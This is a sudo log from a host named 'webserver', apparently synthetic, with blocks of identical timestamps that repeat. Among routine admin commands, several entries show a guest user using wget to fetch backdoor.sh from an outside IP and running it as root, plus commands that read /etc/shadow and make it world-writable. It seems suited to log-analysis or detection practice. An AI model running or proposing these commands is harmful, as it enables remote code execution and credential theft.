Jul 18 12:23:22 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/usr/bin/apt update
Jul 18 12:23:22 webserver sudo:   root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
Jul 18 12:23:22 webserver sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status app.service
Jul 18 12:23:22 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/whoami
Jul 18 12:23:22 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/wget http://45.155.205.90/backdoor.sh -O /tmp/.x
Jul 18 12:23:22 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/bash /tmp/.x
Jul 18 12:23:22 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jul 18 12:23:22 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow
Jul 18 12:27:01 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/usr/bin/apt update
Jul 18 12:27:01 webserver sudo:   root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
Jul 18 12:27:01 webserver sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status app.service
Jul 18 12:27:01 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/whoami
Jul 18 12:27:01 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/wget http://45.155.205.90/backdoor.sh -O /tmp/.x
Jul 18 12:27:01 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/bash /tmp/.x
Jul 18 12:27:01 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jul 18 12:27:01 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow
Jul 18 12:28:35 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/usr/bin/apt update
Jul 18 12:28:35 webserver sudo:   root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
Jul 18 12:28:35 webserver sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status app.service
Jul 18 12:28:35 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/whoami
Jul 18 12:28:35 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/wget http://45.155.205.90/backdoor.sh -O /tmp/.x
Jul 18 12:28:35 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/bash /tmp/.x
Jul 18 12:28:35 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jul 18 12:28:35 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow
Jul 18 12:28:50 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/usr/bin/apt update
Jul 18 12:28:50 webserver sudo:   root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
Jul 18 12:28:50 webserver sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status app.service
Jul 18 12:28:50 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/whoami
Jul 18 12:28:50 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/usr/bin/wget http://45.155.205.90/backdoor.sh -O /tmp/.x
Jul 18 12:28:50 webserver sudo:   guest : TTY=pts/0 ; PWD=/home/guest ; USER=root ; COMMAND=/bin/bash /tmp/.x
Jul 18 12:28:50 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/bin/cat /etc/shadow
Jul 18 12:28:50 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow
Jul 18 12:49:26 webserver sudo:   ibrahim : TTY=pts/0 ; PWD=/home/ibrahim ; USER=root ; COMMAND=/usr/bin/apt update
Jul 18 12:49:28 webserver sudo:   root : TTY=pts/0 ; PWD=/home/root ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
Jul 18 12:49:30 webserver sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status app.service
Jul 18 12:49:33 webserver sudo:   www-data : TTY=pts/0 ; PWD=/home/www-data ; USER=root ; COMMAND=/usr/bin/whoami
